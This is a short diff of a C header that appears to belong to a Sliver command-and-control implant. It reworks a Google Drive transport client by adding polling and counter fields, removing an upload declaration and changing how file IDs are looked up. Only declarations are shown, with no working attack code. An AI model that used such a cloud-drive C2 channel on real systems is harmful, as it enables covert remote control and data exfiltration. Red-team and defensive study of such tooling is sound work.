@@ -6,12 +6,16 @@ typedef struct _DRIVE_CONFIG {
 	LPSTR lpRefreshToken;
 	LPSTR lpSendExtension;
 	LPSTR lpRecvExtension;
+	LPSTR lpStartExtension;
 } DRIVE_CONFIG, * PDRIVE_CONFIG;
 
 struct _SLIVER_DRIVE_CLIENT {
 	PHTTP_CONFIG pHttpConfig;
 	PDRIVE_CONFIG* DriveList;
 	DWORD dwNumberOfDriveConfigs;
+	DWORD dwRecvCounter;
+	DWORD dwSendCounter;
+	DWORD dwPollInterval;
 };
 
 typedef enum {
@@ -52,20 +56,11 @@ BOOL RefreshAccessToken
 	PDRIVE_CONFIG pDriveConfig
 );
 
-BOOL DriveUpload
-(
-	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
-	_In_ PBYTE pData,
-	_In_ DWORD cbData,
-	_In_ DriveOperation Operaion
-);
-
-BOOL GetFileId
+LPSTR GetFileId
 (
 	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
 	_In_ PDRIVE_CONFIG pDriveConfig,
-	_In_ LPSTR lpPattern,
-	_Out_ LPSTR* pId
+	_In_ LPSTR lpPattern
 );
 
 PBUFFER DriveDownload
